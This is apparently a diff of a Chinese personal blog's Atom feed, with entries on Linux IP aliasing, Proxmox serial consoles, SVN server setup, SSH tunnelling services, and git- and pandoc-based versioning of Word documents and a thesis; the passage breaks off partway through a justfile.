+    <content type="html"><![CDATA[<blockquote><p>不影响原网卡配置，降低故障风险，不影响业务正常运行</p></blockquote><h2 id="临时添加">临时添加：</h2><h3 id="使用-ip-命令">使用 <code>ip</code> 命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ip addr add 10.100.100.231/24 dev eth0:0<br></code></pre></td></tr></table></figure><h3 id="使用-ifconfig-命令">使用 <code>ifconfig</code> 命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ifconfig eth0:0 10.100.100.235 netmask 255.255.255.0 up<br></code></pre></td></tr></table></figure><h2 id="永久添加">永久添加：</h2><h3 id="deb-系发行版">deb 系发行版：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cat /etc/network/interfaces</span><br>auto ens33<br>iface ens33 inet static<br>       address 10.17.34.231<br>       netmask 255.255.255.0<br>       gateway 10.17.34.1<br><br>auto ens33:0<br>iface ens33:0 inet static<br>       address 10.100.100.231<br>       netmask 255.255.255.0<br></code></pre></td></tr></table></figure><h3 id="rpm-系发行版">rpm 系发行版：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cat /etc/sysconfig/network-scripts/ifcfg-eno3</span><br>DEVICE=eno3<br>ONBOOT=<span class="hljs-built_in">yes</span><br>BOOTPROTO=<span class="hljs-string">&quot;static&quot;</span><br>IPADDR=10.17.34.234<br>PREFIX=24<br><br><span class="hljs-comment"># cat /etc/sysconfig/network-scripts/ifcfg-eno3:0</span><br>DEVICE=eno3:0<br>ONBOOT=<span class="hljs-built_in">yes</span><br>IPADDR=10.100.100.234<br>PREFIX=24<br></code></pre></td></tr></table></figure><p>保存退出，启用网卡 ifup eno3:0 即可。多个 IP 则添加多个文件<code>:1</code>、<code>:2</code> ...</p><p>配置不同的网卡只需要修改 DEVICE、IPADDR、NETMASK(或者PREFIX)，网卡配置文件中的变量名都必须是大写。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;blockquote&gt;
+&lt;p&gt;不影响原网卡配置，降低故障风险，不影响业务正常运行&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&quot;临时添加&quot;&gt;临时添加：&lt;/h2&gt;
+&lt;h3 id=&quot;使用-ip-命令&quot;&gt;使用 &lt;code&gt;ip&lt;/code&gt; 命令&lt;/h3&gt;
+&lt;figure cl</summary>
+      
+    
+    
+    
+    
+    <category term="linux" scheme="https://blog.oopsky.top/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PVE：为 VM 启用 xterm.js 控制台</title>
+    <link href="https://blog.oopsky.top/post/e393644d/"/>
+    <id>https://blog.oopsky.top/post/e393644d/</id>
+    <published>2023-08-30T01:42:00.000Z</published>
+    <updated>2023-09-03T20:54:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="关闭-vm并给-vm-添加一个-serial-port">关闭 VM，并给 VM 添加一个serial port</h3><p>在 PVE Host 中用 qm 命令建立 serial port，假设我的 VM ID 是 100</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">qm <span class="hljs-built_in">set</span> 100 -serial0 socket<br></code></pre></td></tr></table></figure><p>接着重开 VM，用 dmesg 确认是否有 ttyS 出現</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dmesg | grep ttyS<br></code></pre></td></tr></table></figure><h3 id="vm-内修改-grub-配置">VM 内修改 grub 配置</h3><p>依照官方说明，修改 /etc/default/grub 的 GRUB_CMDLINE_LINUX参数，在，添加 <code>console=tty0 console=ttyS0,115200</code></p><p>deb/rpm 系发行版有不同的更新 grub 配置文件的方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># deb</span><br>update-grub<br><span class="hljs-comment"># rpm</span><br>grub2-mkconfig --output=/boot/grub2/grub.cfg<br></code></pre></td></tr></table></figure><p>最后重启 VM</p><p>然后可以在浏览器内打开 PVE 界面测试 xterm.js 是否可用</p><p>也可以在 PVE Host 的终端内执行 <code>qm terminal 100</code> 来连接到VM</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;关闭-vm并给-vm-添加一个-serial-port&quot;&gt;关闭 VM，并给 VM 添加一个
+serial port&lt;/h3&gt;
+&lt;p&gt;在 PVE Host 中用 qm 命令建立 serial port，假设我的 VM ID 是 100&lt;/p&gt;
+&lt;figure cla</summary>
+      
+    
+    
+    
+    
+    <category term="linux" scheme="https://blog.oopsky.top/tags/linux/"/>
+    
+    <category term="pve" scheme="https://blog.oopsky.top/tags/pve/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>在 Linux 上部署服务之 SVN</title>
+    <link href="https://blog.oopsky.top/post/81178978/"/>
+    <id>https://blog.oopsky.top/post/81178978/</id>
+    <published>2023-07-19T16:46:04.000Z</published>
+    <updated>2023-09-08T08:48:35.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="准备工作">0. 准备工作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在系统中创建用来运行 svn 进程的账户</span><br>user add -m svn<br><span class="hljs-comment"># 创建相关目录</span><br>su svn<br><span class="hljs-built_in">mkdir</span> /home/svn/svn_repos/<br><span class="hljs-built_in">mkdir</span> /home/svn/log<br><span class="hljs-built_in">touch</span> /home/svn/log/svn.log<br><span class="hljs-built_in">mkdir</span> /home/svn/svn_users.conf<br><span class="hljs-built_in">cd</span> /home/svn/svn_repos/<br></code></pre></td></tr></table></figure><h2 id="创建仓库">1. 创建仓库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">svnadmin create test1<br>svnadmin create test2<br></code></pre></td></tr></table></figure><h2 id="修改仓库配置">2. 修改仓库配置</h2><ul><li>svnserve.conf</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># cat test1/conf/svnserve.conf</span><br><span class="hljs-section">[general]</span><br><span class="hljs-attr">anon-access</span> = none<br><span class="hljs-attr">auth-access</span> = write<br><span class="hljs-attr">password-db</span> = /home/svn/svn_users.conf/passwd<br><span class="hljs-attr">authz-db</span> = /home/svn/svn_users.conf/authz<br><span class="hljs-attr">realm</span> = test1<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># cat test2/conf/svnserve.conf</span><br><span class="hljs-section">[general]</span><br><span class="hljs-attr">anon-access</span> = none<br><span class="hljs-attr">auth-access</span> = write<br><span class="hljs-attr">password-db</span> = /home/svn/svn_users.conf/passwd<br><span class="hljs-attr">authz-db</span> = /home/svn/svn_users.conf/authz<br><span class="hljs-attr">realm</span> = test2<br></code></pre></td></tr></table></figure><p>修改完 <code>svnserve.conf</code> 后必须重启 svn服务，修改下面两个文件无需重启 svn 服务</p><h2 id="创建仓库间公用的认证文件">3. 创建仓库间公用的认证文件</h2><ul><li>passwd</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># cat /home/svn/svn_users.conf/passwd</span><br><span class="hljs-section">[users]</span><br><span class="hljs-attr">admin</span> = admin<br><span class="hljs-attr">user1</span> = user1<br><span class="hljs-attr">user2</span> = user2<br></code></pre></td></tr></table></figure><ul><li>authz</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># cat /home/svn/svn_users.conf/authz</span><br><span class="hljs-section">[groups]</span><br><span class="hljs-attr">Admin</span> = admin,user1<br><span class="hljs-attr">Dev</span> = user1,user2<br><br><span class="hljs-section">[test1:/]</span><br>@<span class="hljs-attr">Admin</span> = rw<br>@<span class="hljs-attr">Dev</span> = rw<br>* =<br><br><span class="hljs-section">[test2:/]</span><br>@<span class="hljs-attr">Admin</span> = rw<br>@<span class="hljs-attr">Dev</span> = r<br>* =<br></code></pre></td></tr></table></figure><h2 id="设定开机自启">4. 设定开机自启</h2><p>创建/修改 <code>/etc/systemd/system/svn.service</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># cat /etc/systemd/system/svn.service</span><br><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=Subversion Server<br><span class="hljs-attr">After</span> = network.target syslog.target<br><span class="hljs-attr">Wants</span> = network.target<br><br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">User</span>=svn<br><span class="hljs-attr">Group</span>=svn<br><span class="hljs-attr">Type</span>=forking<br><span class="hljs-attr">ExecStart</span>=/usr/bin/svnserve --daemon --log-file /home/svn/log/svn.log --root /home/svn/svn_repos<br><span class="hljs-attr">ExecStop</span>=/usr/bin/killall svnserve<br><span class="hljs-attr">Restart</span>=always<br><br><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=default.target<br></code></pre></td></tr></table></figure><p>然后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /home/svn/log/<br><span class="hljs-built_in">touch</span> /home/svn/log/svn.log <span class="hljs-comment"># 创建日志文件</span><br>systemctl daemon-reload <span class="hljs-comment"># 刷新systemd配置</span><br>systemctl start svn <span class="hljs-comment"># 启动svn</span><br>systemctl <span class="hljs-built_in">enable</span> svn <span class="hljs-comment"># 设定开机自启</span><br></code></pre></td></tr></table></figure><h2 id="测试">5. 测试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">svn co svn://localhost/test1 test1 --username admin --password admin<br>svn add path/to/file<br>svn ci -m <span class="hljs-string">&#x27;xxxxx&#x27;</span> --username admin --password admin<br></code></pre></td></tr></table></figure><p>The end...</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;准备工作&quot;&gt;0. 准备工作&lt;/h2&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;lin</summary>
+      
+    
+    
+    
+    
+    <category term="linux" scheme="https://blog.oopsky.top/tags/linux/"/>
+    
+    <category term="svn" scheme="https://blog.oopsky.top/tags/svn/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>几个基于 SSH 的内网穿透服务</title>
+    <link href="https://blog.oopsky.top/post/9821b2d1/"/>
+    <id>https://blog.oopsky.top/post/9821b2d1/</id>
+    <published>2023-05-04T23:19:58.000Z</published>
+    <updated>2023-05-04T23:19:58.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="serveo.net">1. serveo.net</h2><p>直接在命令行执行下面命令即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh serveo.net -R 80:localhost:4000<br></code></pre></td></tr></table></figure><p>更多使用姿势敬请移步该项目<ahref="https://serveo.net">官网</a>查看。</p><h2 id="srv.us">2. srv.us</h2><p>创建单个隧道</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh srv.us -R 1:localhost:4000<br></code></pre></td></tr></table></figure><p>同时创建多个隧道</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh srv.us -R 1:localhost:4000 -R 2:192.168.0.1:80<br></code></pre></td></tr></table></figure><h2 id="localhost.run">3. localhost.run</h2><p>临时使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -R 80:localhost:4000 nokey@localhost.run<br></code></pre></td></tr></table></figure><p><ahref="https://admin.localhost.run/">注册账号</a>并上传公钥后可以直接使用<code>localhost.run</code>创建隧道，这样分配的子域名可以保持较久一些</p><h2 id="sish">4. sish</h2><p>如果想自建类似的服务，可以看看这个。</p><p>Github：<ahref="https://github.com/antoniomika/sish">https://github.com/antoniomika/sish</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;serveo.net&quot;&gt;1. serveo.net&lt;/h2&gt;
+&lt;p&gt;直接在命令行执行下面命令即可：&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=</summary>
+      
+    
+    
+    
+    
+    <category term="ssh" scheme="https://blog.oopsky.top/tags/ssh/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>对 Word 文件进行「纯文本式」版本控制</title>
+    <link href="https://blog.oopsky.top/post/ff9138ea/"/>
+    <id>https://blog.oopsky.top/post/ff9138ea/</id>
+    <published>2023-04-24T03:25:00.000Z</published>
+    <updated>2023-09-27T07:09:53.000Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>今天是 4 月 24日，我刚刚完成我的毕业论文撰写，今天上午提交的最后一版。刚才偶然间在少数派<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="[如何对 Word 文件进行「纯文本式」版本控制？](https://sspai.com/post/58507)">[1]</span></a></sup>发现了这种方法，和我自己用的方法<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="[我是如何折腾我的毕业论文的 - 热心市民L先生のBLOG](https://blog.oopsky.top/post/67e81ff3/)">[2]</span></a></sup>虽目的不同，但有异曲同工之妙，甚好甚好，在此记录一下吧。</p></blockquote><h2 id="准备工作">准备工作</h2><p>第一步，把 Git 与 Pandoc 安装好。</p><p>第二步，向你的 <code>~/.gitconfig</code> 添加下面内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cfg">[diff &quot;pandoc&quot;]<br>  textconv=pandoc --to=markdown<br>  prompt = false<br>[alias]<br>  wdiff = diff --word-diff=color --unified=1<br></code></pre></td></tr></table></figure><p>第三步，新建一个文件夹，在这个文件夹里初始化 Git 仓库（工作区）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> git-word-demo<br><span class="hljs-built_in">cd</span> git-word-demo<br>git init<br></code></pre></td></tr></table></figure><p>第四步，在该文件夹里创建 <code>.gitattributes</code>文件，并向其中写入如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs config">*.docx diff=pandoc<br></code></pre></td></tr></table></figure><p>然后把该文件加入版本版本管理，并 commit 一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git add .gitattributes<br>git commit -m <span class="hljs-string">&quot;init&quot;</span><br></code></pre></td></tr></table></figure><p>自此，准备工作就完成了</p><h2 id="如何使用">如何使用</h2><p>首先新建一个 docx格式的文件，打开它，随便打几个字，然后保存并关闭。</p><p>然后把该文件加入版本管理，并 commit 一下提交当前状态：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git add example.docx<br>git commit -m <span class="hljs-string">&quot;add example.docx&quot;</span><br></code></pre></td></tr></table></figure><p>这就把 <code>example.docx</code> 纳入了版本管理。</p><p>来试一下修改这个文档，例如添加/删除某些字/行/段落等。保存并关闭文档。</p><p>执行 <code>git diff</code>查看工作区中的变动，将可以看到终端中会显示文件的第几行发生了何种变化。</p><p>然后记录变化并 commit 之，参数 <code>-a</code> 的作用是自动记录所有已<code>git add</code> 过的文件的变化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git commit -a -m <span class="hljs-string">&quot;update&quot;</span><br></code></pre></td></tr></table></figure><p>然后可以进行新的修改。</p><h2 id="总结">总结</h2><p>这种方法的优势是能把 docx内排版的变化也一丝不苟地纳入版本控制，但我们无法通过版本控制工具观测到排版的变化，只能比较出文字内容的变化。另外，由于docx是二进制格式，和纯文本相比不够「清真」，可能会导致这个仓库的体积迅速变大（个人猜测，未验证），由于每次diff 都需要 pandoc转换一下，性能应该也有些损耗（至少我感觉是慢了不少）。</p><p>如果你和我有同样的顾虑，欢迎来看我的另一篇文章<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="[我是如何折腾我的毕业论文的 - 热心市民L先生のBLOG](https://blog.oopsky.top/post/67e81ff3/)">[2]</span></a></sup>。</p><section class="footnotes"><h2>参考</h2><div class="footnote-list"><ol><li><span id="fn:1"class="footnote-text"><span><a href="https://sspai.com/post/58507">如何对Word 文件进行「纯文本式」版本控制？</a><a href="#fnref:1" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><ahref="https://blog.oopsky.top/post/67e81ff3/">我是如何折腾我的毕业论文的- 热心市民L先生のBLOG</a><a href="#fnref:2" rev="footnote" class="footnote-backref">↩︎</a></span></span></li></ol></div></section>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;blockquote&gt;
+&lt;p&gt;今天是 4 月 24
+日，我刚刚完成我的毕业论文撰写，今天上午提交的最后一版。刚才偶然间在少数派&lt;sup id=&quot;fnref:1&quot; class=&quot;footnote-ref&quot;&gt;&lt;a href=&quot;#fn:1&quot; rel=&quot;footnote&quot;&gt;&lt;span
+</summary>
+      
+    
+    
+    
+    
+    <category term="git" scheme="https://blog.oopsky.top/tags/git/"/>
+    
+    <category term="pandoc" scheme="https://blog.oopsky.top/tags/pandoc/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>我是如何折腾我的毕业论文的</title>
+    <link href="https://blog.oopsky.top/post/67e81ff3/"/>
+    <id>https://blog.oopsky.top/post/67e81ff3/</id>
+    <published>2023-04-24T03:20:00.000Z</published>
+    <updated>2024-04-30T15:14:31.000Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>经过了历时几个月的论文写作，我的毕业设计的论文部分总算完成了，在此记录一下写论文时使用到的方法。</p></blockquote><p>第一阶段，查资料、写论文。这个阶段我使用纯 markdown编写论文内容并使用 git 做版本管理，不涉及 word 文档。</p><p>第二阶段，快交初稿了。开始有对 word 调格式的需求，在这个阶段我引入了pandoc，并研究了一下使用 pandoc 直接套用模板排版的方法。</p><p>第三阶段，要定稿了。由于需要对论文的排版进行较精确的微调，pandoc +模板 无法胜任这一任务，于是我开始放弃 markdown 格式，全面转到 docx格式，为了避免 word 文档出问题，我写了一个脚本（详见下面 justfile 的 <ahref="#偷懒神器">final部分</a>），在每次编辑后生成一份纯文本并将其和第二阶段的最后一版进行比较，并记录下每次比较的结果。</p><p>下面进入正题，主要是我第二阶段的做法。</p><h2 id="why">Why</h2><ul><li>markdown 作为一种纯文本格式，方便备份，配合 git也能实现较细粒度的版本管理。</li><li>利用 pandoc + 模板来生成 docx 能减少一些重复的格式修改工作。</li><li>用这种方式生成的 docx可以很方便的自动生成目录！（要不然就得手动标注标题以及正文的大纲级别）</li></ul><h2 id="how">How</h2><p>第一步，把 Git 与 Pandoc 安装好。</p><p>第二步，导出 docx 参考模板。</p><p>执行下面命令创建模板</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pandoc.exe -o pandoc/custom-reference.docx --print-default-data-file reference.docx<br></code></pre></td></tr></table></figure><p>第三步，按照自己学校要求修改 <code>custom-reference.docx</code>中的格式</p><ul><li>各级标题字体格式</li><li>正文字体与段落格式</li><li>页码</li><li>页边距</li><li>等等</li></ul><p>第四步，把下面的代码粘贴到到每一个需要插入分页符的位置（我会在文末提供我的markdown 框架）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-code">```&#123;=openxml&#125;</span><br><span class="hljs-code">&lt;w:p&gt;</span><br><span class="hljs-code">  &lt;w:r&gt;</span><br><span class="hljs-code">    &lt;w:br w:type=&quot;page&quot;/&gt;</span><br><span class="hljs-code">  &lt;/w:r&gt;</span><br><span class="hljs-code">&lt;/w:p&gt;</span><br><span class="hljs-code">```</span><br></code></pre></td></tr></table></figure><p>然后可以导出 docx，执行下面命令即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用pandoc默认模板</span><br>pandoc.exe -f markdown &lt;你的文档的文件名&gt;.md -o &lt;要生成的文档的文件名&gt;.docx<br><br><span class="hljs-comment"># 使用你自定义的模板</span><br>pandoc.exe -f markdown &lt;你的文档的文件名&gt;.md -o &lt;要生成的文档的文件名&gt;.docx --reference-doc=custom-reference.docx<br></code></pre></td></tr></table></figure><p>折腾完毕</p><h2 id="其他">其他</h2><p>本文所述方法在 Gitee 上还有一个 Git 仓库<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="[papper-format-helpper](https://gitee.com/waleslau/papper-format-helpper)">[2]</span></a></sup>,有需要的话可以去看看。</p><h3 id="一些调整-docx-排版的技巧">一些调整 docx 排版的技巧</h3><blockquote><p>注：下面的格式修改操作适用于 MS Office 2019 中的 Word，其他版本的 MSOffice 以及金山 WPS 中对应配置的位置与此略有不同</p></blockquote><p>1、添加页码后，删除页眉多出的横线</p><blockquote><p>选中页眉，然后使用<code>Ctrl</code>+<code>Shift</code>+<code>N</code> 快捷键即可</p></blockquote><p>2、为摘要以及正文设置不同的页码格式</p><blockquote><p>首先，选中 <code>布局</code> 选项卡，在摘要的尾部，正文之前插入<code>分隔符-&gt;分节符-&gt;下一页</code>，作用是将 word分节，并自动换页。此时选中页码会提示不同节的序号。</p><p>然后选中正文部分的页码，在 <code>页眉和页脚</code> 选项卡中取消选中<code>链接到前一节</code>，就可以分别调整不同‘节’的页码格式了</p></blockquote><p>3、自动生成的表格宽度不够</p><blockquote><p>选中某个表格，在 <code>表格工具-&gt;布局</code> 选项卡中选中<code>自动调整-&gt;根据窗口自动调整表格</code> 即可</p></blockquote><p>4、修改正文的格式不要改 <code>正文</code>，应该改<code>正文文本</code>。</p><blockquote><p>因为标题等元素会自动继承 <code>正文</code>的格式，修改它会导致一些问题</p></blockquote><h3 id="偷懒神器">偷懒神器</h3><p>just<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="[Just 用户指南](https://just.systems/man/zh/)">[1]</span></a></sup>，一个和make 有点像的命令运行器。</p><p>贴一下我用到的 justfile</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs makefile">crlf_format := if os_family() == <span class="hljs-string">&quot;windows&quot;</span> &#123; &#x27;fd -e md -x sd <span class="hljs-string">&quot;\n&quot;</span> <span class="hljs-string">&quot;\r\n&quot;</span> &amp;&amp; sd <span class="hljs-string">&quot;\n&quot;</span> <span class="hljs-string">&quot;\r\n&quot;</span> .justfile&#x27; &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-string">&quot;uname -sm&quot;</span> &#125;<br><br><span class="hljs-comment"># 格式化源代码</span><br><span class="hljs-section">fmt:</span><br>    fd -e md -x mdfmt -w<br>    just cc<br>    just --fmt --unstable<br>    &#123;&#123; crlf_format &#125;&#125;、<br><br><span class="hljs-comment"># 生成docx用来预览</span><br><span class="hljs-section">doc: fmt</span><br>    pandoc -f markdown 论文.md -o output/论文预览-`date +<span class="hljs-string">&quot;%Y-%m-%d_%H-%M&quot;</span>`.docx --reference-doc=pandoc/custom-reference-MyFormat.docx<br>    @pandoc.exe -t plain -i 论文.md -o count.txt<br>    just cc<br>    @rm count.txt<br><br><span class="hljs-comment"># 重新生成docx模板</span><br><span class="hljs-section">regen_ref:</span><br>    pandoc -o pandoc/custom-reference.docx --print-default-data-file reference.docx<br><br><span class="hljs-comment"># 应用更改并提交至多个远程仓库</span><br><span class="hljs-section">done: fmt</span><br>    git commit -a -m <span class="hljs-string">&quot;update&quot;</span><br>    git remote | xargs -I _ git push _<br><br><span class="hljs-comment"># 字数统计</span><br><span class="hljs-section">cc:</span><br>    <span class="hljs-comment">#!/usr/bin/env python3</span><br>    import re<br>    with open(<span class="hljs-string">&quot;count.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) as f:<br>        <span class="hljs-comment"># 读取文件内容</span><br>        text = f.read()<br>        <span class="hljs-comment"># 统计汉字数量</span><br>        pattern = re.compile(r&#x27;[\u4e00-\u9fa5]&#x27;)<br>        chinese_chars = pattern.findall(text)<br>        chinese_count = len(chinese_chars)<br>        <span class="hljs-comment"># 统计英文字母数量</span><br>        pattern = re.compile(r&#x27;[a-zA-Z]&#x27;)<br>        english_chars = pattern.findall(text)<br>        english_count = len(english_chars)<br>        <span class="hljs-comment"># 统计标点符号数量</span><br>        pattern = 